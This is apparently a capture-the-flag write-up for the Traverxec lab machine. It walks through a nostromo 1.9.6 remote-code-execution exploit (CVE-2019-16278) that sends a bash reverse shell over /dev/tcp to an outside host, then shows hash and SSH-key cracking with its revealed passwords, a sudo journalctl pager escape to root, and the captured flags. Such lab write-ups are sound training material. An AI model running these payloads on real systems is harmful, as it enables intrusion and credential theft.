# Traverxec

## SYN Scan
```
nmap -sS -sV -O -p- -v -T4 -Pn -oA nmap/full_syn 10.10.10.165

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    nostromo 1.9.6

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## The Web Application
![web_app](./screenshots/web_app.png)

## RCE via Directory Traversal
```
Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request.
```

https://nvd.nist.gov/vuln/detail/CVE-2019-16278

https://www.exploit-db.com/exploits/47837

### Exploitation
```
python2 cve2019-16278.py 10.10.10.165 80 "bash -c 'bash -i >& 2>/dev/tcp/10.10.14.26/4444 0>&1'"
```

```
(remote) www-data@traverxec:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Local User Enumeration
```
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

## David's Hash
```
(remote) www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
...
servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
...
htpasswd		/var/nostromo/conf/.htpasswd
...
```

```
(remote) www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

### Cracked The md5crypt Hash
Used `Hashcat` with `rockyou` to crack the hash.

```
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
```

## Accessible Folder of david
```
(remote) www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

```
(remote) www-data@traverxec:/home/david/public_www$ ls -l
total 8
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

```
(remote) www-data@traverxec:/home/david/public_www/protected-file-area$ ls -l
total 4
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```

## Encrypted RSA Private Key
```
$ file backup-ssh-identity-files.tgz 
backup-ssh-identity-files.tgz: gzip compressed data, last modified: Fri Oct 25 21:02:59 2019, from Unix, original size modulo 2^32 10240
```

`home/david/.ssh/`
```
$ ls -l 
total 12
-rw-r--r-- 1 cpt cpt  397 Oct 26  2019 authorized_keys
-rw------- 1 cpt cpt 1766 Oct 26  2019 id_rsa
-rw-r--r-- 1 cpt cpt  397 Oct 26  2019 id_rsa.pub
```

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
...
```

### Cracked The RSA Private Key
Used `JohnTheRipper` with `rockyou` to crack the RSA private key of `david`.

```
john david_id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt --fork=12
...
hunter           (id_rsa)
...
```

## Privilege Escalation via RSA Private Key (david)
Used the RSA private key to log in as `david`.

```
ssh -i david_backup/home/david/.ssh/id_rsa david@10.10.10.165
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

## The User Flag
```
david@traverxec:~$ ls -l /home/david/
total 12
drwx------ 2 david david 4096 Oct 25  2019 bin
drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www
-r--r----- 1 root  david   33 Oct 25  2019 user.txt
```

```
david@traverxec:~$ cat /home/david/user.txt 
7db0b48469606a42cec20750d9782f3d
```

## Interesting Log Script
Found `server-stats.sh` in `/home/david/bin` folder. It contains an interesting logging script. 

```
david@traverxec:~/bin$ ls -l
total 8
-r-------- 1 david david 802 Oct 25  2019 server-stats.head
-rwx------ 1 david david 363 Oct 25  2019 server-stats.sh
```

```
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

## Privilege Escalation via NOPASSWD Executable (root)
Examined the script and realized that `david` executes `journalctl` with `root` privileges.

```
...
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
...
```

Tried to run the command.

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-- Logs begin at Wed 2021-04-14 11:16:00 EDT, end at Wed 2021-04-14 12:29:15 EDT. --
Apr 14 11:45:51 traverxec sudo[15243]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/2 ruser=www-data rhost=  user=www-data
Apr 14 11:45:55 traverxec sudo[15243]: pam_unix(sudo:auth): conversation failed
Apr 14 11:45:55 traverxec sudo[15243]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Apr 14 11:45:55 traverxec sudo[15243]: www-data : command not allowed ; TTY=pts/2 ; PWD=/ ; USER=root ; COMMAND=list
Apr 14 12:01:07 traverxec crontab[12483]: (www-data) LIST (www-data)
```

It worked. That means `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` can be executed as `root` privileges.

### Exploitation
https://gtfobins.github.io/gtfobins/journalctl/

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
...
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

## The Root Flag
```
root@traverxec:/home/david/bin# ls -l /root/
total 44
-rw-r--r-- 1 root root 37520 Oct 25  2019 nostromo_1.9.6-1.deb
-r-------- 1 root root    33 Oct 25  2019 root.txt
```

```
root@traverxec:/home/david/bin# cat /root/root.txt 
9aa36a6d76f785dfd320a478f6e0d906
```
